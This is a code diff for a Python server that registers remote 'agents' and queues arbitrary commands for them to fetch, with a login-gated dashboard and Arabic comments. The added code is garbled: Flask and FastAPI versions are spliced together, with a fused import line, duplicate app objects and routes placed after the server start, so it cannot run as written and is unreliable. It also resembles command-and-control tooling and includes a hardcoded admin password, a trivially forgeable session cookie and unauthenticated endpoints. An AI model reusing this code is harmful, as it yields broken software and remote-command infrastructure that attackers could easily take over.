@@ -1,190 +1,106 @@
-from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
-from fastapi.responses import HTMLResponse
+from flask import Flask, render_template, request, jsonify
+import json
 from datetime import datetime
-import asyncio
 
-app = FastAPI(title="Central Agent Control")
+app = Flask(__name__)
 
-# ================== STORAGE ==================
-clients = {}        # agent_id -> info
-commands = {}       # agent_id -> command
-connections = set() # websocket clients
-# =============================================
+# مخزن مؤقت للبيانات (في الإنتاج يفضل استخدام SQLite)
+agents = {}
+commands = {}
 
+@app.route('/')
+def index():
+    return render_template('index.html', agents=agents)
 
-# ================== UTILS ==================
-async def broadcast():
-    dead = set()
-    for ws in connections:
-        try:
-            await ws.send_json(clients)
-        except:
-            dead.add(ws)
-    connections.difference_update(dead)
-# ===========================================
+@app.route('/register', methods=['POST'])
+def register():
+    data = request.json
+    agent_id = data['agent_id']
+    data['last_seen'] = datetime.now().strftime("%H:%M:%S")
+    data['status'] = "Online"
+    agents[agent_id] = data
+    return jsonify({"status": "success"})from fastapi import FastAPI, Request, Form, status
+from fastapi.responses import HTMLResponse, RedirectResponse
+from fastapi.templating import Jinja2Templates
+from pydantic import BaseModel
+from typing import Dict, Optional
+import uvicorn
 
+app = FastAPI()
+templates = Jinja2Templates(directory="templates")
 
-# ================== API ==================
-@app.get("/")
-def root():
-    return {"status": "running", "time": str(datetime.now())}
+# --- الإعدادات ---
+ADMIN_USER = "admin"
+ADMIN_PASS = "123456" # غيرها فوراً
 
+agents: Dict[str, dict] = {}
+commands: Dict[str, str] = {}
 
-@app.get("/agents")
-def get_agents():
-    return clients
+def is_logged_in(request: Request):
+    return request.cookies.get("session") == "active"
 
+@app.get("/", response_class=HTMLResponse)
+async def dashboard(request: Request):
+    if not is_logged_in(request):
+        return templates.TemplateResponse("login.html", {"request": request})
+    return templates.TemplateResponse("index.html", {"request": request, "agents": agents})
+
+@app.post("/login")
+async def login(username: str = Form(...), password: str = Form(...)):
+    if username == ADMIN_USER and password == ADMIN_PASS:
+        resp = RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
+        resp.set_cookie(key="session", value="active", httponly=True)
+        return resp
+    return HTMLResponse("Access Denied")
+
+@app.get("/logout")
+async def logout():
+    resp = RedirectResponse(url="/")
+    resp.delete_cookie("session")
+    return resp
 
 @app.post("/register")
-async def register(req: Request):
-    data = await req.json()
-    cid = data.get("agent_id")
+async def register(data: dict):
+    agent_id = data.get('agent_id')
+    agents[agent_id] = data
+    return {"status": "ok"}
 
-    clients[cid] = {
-        "ip": req.client.host,
-        "hostname": data.get("hostname"),
-        "local_ip": data.get("local_ip"),
-        "started_at": data.get("started_at"),
-        "last_seen": str(datetime.now()),
-        "status": "online"
-    }
-
-    await broadcast()
-    return {"registered": cid}
-
-
-@app.post("/heartbeat")
-async def heartbeat(req: Request):
-    data = await req.json()
-    cid = data.get("agent_id")
-
-    if cid in clients:
-        clients[cid]["last_seen"] = str(datetime.now())
-        clients[cid]["status"] = "online"
-        await broadcast()
-
-    return {"ok": True}
-
-
-@app.post("/command")
-async def set_command(req: Request):
-    data = await req.json()
-    commands[data["agent_id"]] = data["command"]
-    return {"sent": True}
-
-
-@app.get("/command/{agent_id}")
-def get_command(agent_id: str):
+@app.post("/poll")
+async def poll(data: dict):
+    agent_id = data.get('agent_id')
+    if data.get('result') and agent_id in agents:
+        agents[agent_id]['last_result'] = data['result']
+    
     cmd = commands.pop(agent_id, None)
-    return {"command": cmd}
-# ===========================================
+    return {"command": cmd} if cmd else {"status": "idle"}
 
+@app.post("/send_command")
+async def send_command(request: Request, agent_id: str = Form(...), command: str = Form(...)):
+    if is_logged_in(request):
+        commands[agent_id] = command
+    return RedirectResponse(url="/", status_code=status.HTTP_303_SEE_OTHER)
 
-# ================== WEBSOCKET ==================
-@app.websocket("/ws")
-async def ws_endpoint(ws: WebSocket):
-    await ws.accept()
-    connections.add(ws)
+if __name__ == "__main__":
+    uvicorn.run(app, host="0.0.0.0", port=8000)
 
-    # 🔥 أرسل الحالة الحالية فور الاتصال
-    await ws.send_json(clients)
+@app.route('/poll', methods=['POST'])
+def poll():
+    agent_id = request.json.get('agent_id')
+    if agent_id in agents:
+        agents[agent_id]['last_seen'] = datetime.now().strftime("%H:%M:%S")
+        
+    # التحقق من وجود أوامر لهذا الجهاز
+    cmd = commands.pop(agent_id, None)
+    if cmd:
+        return jsonify({"command": cmd})
+    return jsonify({"status": "no_commands"})
 
-    try:
-        while True:
-            await ws.receive_text()
-    except WebSocketDisconnect:
-        connections.remove(ws)
-# ===============================================
+@app.route('/send_command', methods=['POST'])
+def send_command():
+    agent_id = request.form.get('agent_id')
+    cmd = request.form.get('command')
+    commands[agent_id] = cmd
+    return "Command Sent!"
 
-
-# ================== DASHBOARD ==================
-@app.get("/dashboard", response_class=HTMLResponse)
-def dashboard():
-    return """
-<!DOCTYPE html>
-<html>
-<head>
-<title>Agent Control Dashboard</title>
-<style>
-body { background:#0b0f14; color:#eee; font-family:Arial }
-table { width:100%; border-collapse:collapse }
-th,td { padding:8px; border-bottom:1px solid #222 }
-.online { color:#4caf50 }
-.offline { color:#f44336 }
-</style>
-</head>
-<body>
-
-<h2>Agent Control Dashboard</h2>
-<input id="q" placeholder="Search hostname">
-
-<table>
-<thead>
-<tr>
-<th>ID</th><th>Hostname</th><th>Local IP</th><th>Status</th><th>Uptime</th><th>Action</th>
-</tr>
-</thead>
-<tbody id="rows"></tbody>
-</table>
-
-<script>
-let agents = {};
-
-function uptime(start){
- if(!start) return '';
- let s=Math.floor((Date.now()-Date.parse(start))/1000);
- return Math.floor(s/60)+' min';
-}
-
-function render(){
- let q=document.getElementById('q').value.toLowerCase();
- let tbody=document.getElementById('rows');
- tbody.innerHTML='';
- Object.keys(agents).forEach(id=>{
-  let a=agents[id];
-  if(q && !(a.hostname||'').toLowerCase().includes(q)) return;
-  let tr=document.createElement('tr');
-  tr.innerHTML=`
-   <td>${id.slice(0,8)}…</td>
-   <td>${a.hostname||''}</td>
-   <td>${a.local_ip||''}</td>
-   <td class="${a.status}">${a.status}</td>
-   <td>${uptime(a.started_at)}</td>
-   <td><button onclick="ping('${id}')">Ping</button></td>
-  `;
-  tbody.appendChild(tr);
- });
-}
-
-function ping(id){
- fetch('/command',{
-   method:'POST',
-   headers:{'Content-Type':'application/json'},
-   body:JSON.stringify({agent_id:id,command:'ping'})
- });
-}
-
-// 🔥 تحميل أولي
-fetch('/agents')
- .then(r=>r.json())
- .then(data=>{
-   agents=data;
-   render();
- });
-
-// 🔥 WebSocket
-let ws=new WebSocket(
- (location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws'
-);
-ws.onmessage=e=>{
- agents=JSON.parse(e.data);
- render();
-};
-
-document.getElementById('q').onkeyup=render;
-</script>
-
-</body>
-</html>
-"""
-# ===============================================
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
